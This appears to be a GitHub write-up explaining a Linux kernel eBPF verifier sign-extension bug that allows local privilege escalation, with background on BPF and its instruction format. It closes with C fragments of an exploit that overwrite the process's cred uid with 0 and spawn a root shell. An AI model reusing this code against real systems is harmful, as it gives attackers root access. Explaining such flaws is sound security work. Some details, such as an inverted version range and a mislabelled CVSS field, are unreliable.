# Linux Kernel - BPF Sign Extension Local Privilege Escalation

![alt text](https://github.com/samaleyadeh/images/blob/master/DY42GCGV4AA1_8F.jpg) 

This vulnerability was caused by a bug in the linux kernel that allowed sign extension from a signed 32-bit integer to an unsigned 64-bit integer, bypassing eBPF verifier and leading to local privilege escalation. The check_alu_op function in kernel/bpf/verifier.c in the Linux kernel allows local users to cause a denial of service (memory corruption) or possibly have unspecified other impact by leveraging incorrect sign extensions.

This could occur due to the fact taht before each of the BPF program runs, two passes of verifications are conducted to ensure its correctness. The first pass check_cfg() ensures the code is loop-free using depth-first search. The second pass do_check() runs a static analysis to emulate the execution of all possible paths derived from the first instruction. The program will be terminated if any invalid instruction or memory violation is found.

In the exploit, a set of BPF instructions are carefully crafted to bypass this filtering process through an unintentional sign extension from 32 bits to 64 bits. As a result, a few lines of malicious code could be attached and get executed in the kernel space, resulting in a hack refered to as privilege escalation explained below. 

This vulnerability allowed attacker to have full control of the system with root access. The low complexity of the attack and low privileges required to perform this exploit made it high priority. 

It affected specific versions of linux based system, but given that Ubuntu has a large number of users around the world, especially public cloud users, the vulnerability had the potetional to cause diruptions at a significant scale for both corporate and individual users.

### Vulnerability Overview and Impact
Linux Kernel Version: 4.14 - 4.4 (mainly Ubuntu and Debian)
CVSS v3 Score: 7.8 (Severity: high)
Confidentiality: High
Integrity: High
Authority: High


## [What is Sign Extension?](https://en.wikipedia.org/wiki/Sign_extension)

Is a simple process by wich the represetnation of a value in memory is changed from a lower number of bits to a higher number of bits while preserving its content and sign in the process as illistrated in the figure above

![alt text](https://github.com/samaleyadeh/images/blob/master/sign-extension.jpg) 


## [What is Privilege Escalation](https://en.wikipedia.org/wiki/Privilege_escalation)
![alt text](https://github.com/samaleyadeh/images/blob/master/300px-Priv_rings.svg.png?raw=true) 

In this form of attacks the aim is to raise the abilities and access of the attacker from the intrusion level to higher abilites with the ultimate goal of gaining root access.

## [What is BPF](https://en.wikipedia.org/wiki/Berkeley_Packet_Filter)?

As you may know, the user layer and kernel layer of Linux are isolated. If you want the kernel to execute the user's code, you need to write the kernel module which can only be loaded by the root user. The BPF (Berkeley Packet Filter) provides a bridge between code and data transfer between the user and the kernel. The user can use the eBPF instruction bytecode to deliver code to the kernel, and trigger the kernel to execute the user-provided code through events (such as writing data to the socket), and share the data with the kernel in the form of map (key - value). The user layer writes data to the map, and the kernel layer fetches data from the map, and vice versa. 
The original intention of BPF is to filter the network at the bottom, and later it can easily inject code into the kernel. It is widely used for packet capture, kernel probe, Performance monitoring and other fields. 
eBPF virtual instruction system
The eBPF virtual instruction system belongs to Reduced Instruction Set Computer (RISC) and has 10 64-bit virtual registers, r0-r10. r0 stores the return value, r1 to r5 is reserved for arguments, r6 to r9 is reserved for storing callee saved registers and r10 stores read-only frame pointer. In actual operation, the virtual machine corresponds these 10 registers to the 10 physical registers of the hardware CPU: R0 - rax, R1 - rdi , R2 - rsi , R3 - rdx , R4 - rcx , R5 - r8 , R6 - rbx , R7 - r13 , R8 - r14 , R9 - r15 , R10 â€“ rbp(frame pointer).
Each BPF instruction on x64 platform is of 64-bit long. The format of each instruction is as follows:

![alt text](https://github.com/samaleyadeh/images/blob/master/zero-day-attack-1024x413.jpg) 

```C
Struct bpf_insn { 
    __u8 code;         /* opcode */ 
    __u8 dst_reg: 4 ;     /* dest register */ 
    __u8 src_reg: 4 ;     /* source register */ 
    __s16 off;         /* signed offset */ 
    __s32 imm;         /* signed immediate constant */ 
};
```
For example, a simple x86 assignment instruction: mov eax, 0xffffffff, the corresponding BPF instruction is: BPF_MOV32_IMM (BPF_REG_2, 0xFFFFFFFF), and its corresponding data structure is:


```C

#define BPF_MOV32_IMM(DST, IMM) \ 
    (( struct bpf_insn) { \ 
        .code   = BPF_ALU | BPF_MOV | BPF_K, \ 
        .dst_reg = DST, \ 
        .src_reg = 0 , \ 
        .off    = 0 , \ 
        .imm    = IMM })

```
Its value in memory is: ``` \xb4\x09\x00\x00\xff\xff\xff\xff . ```
In conclusion, 
1. eBPF virtual instruction system is a RISC instruction system, that is, each instruction size is the same; 
2. Its virtual 10 registers correspond 10 physical cpu registers, and the function is similar. For example, the r10 register of the BPF and the rbp point to the stack, and r0 is used for the return value.


```C
uint64_t fp, sp, task_struct, credptr, uidptr;

	fp = __get_fp();
	if (fp < PHYS_OFFSET)
		__exit("bogus fp");
	
	sp = get_sp(fp);
	if (sp < PHYS_OFFSET)
		__exit("bogus sp");
	
	task_struct = __read(sp);

	if (task_struct < PHYS_OFFSET)
		__exit("bogus task ptr");

	printf("task_struct = %lx\n", task_struct);
```


```C
	credptr = __read(task_struct + CRED_OFFSET); // cred

	if (credptr < PHYS_OFFSET)
		__exit("bogus cred ptr");

	uidptr = credptr + UID_OFFSET; // uid
	if (uidptr < PHYS_OFFSET)
		__exit("bogus uid ptr");

	printf("uidptr = %lx\n", uidptr);
	__write(uidptr, 0); // set both uid and gid to 0

	if (getuid() == 0) {
		printf("spawning root shell\n");
		system("/bin/bash");
		exit(0);
	}

	__exit("not vulnerable?");
}
```


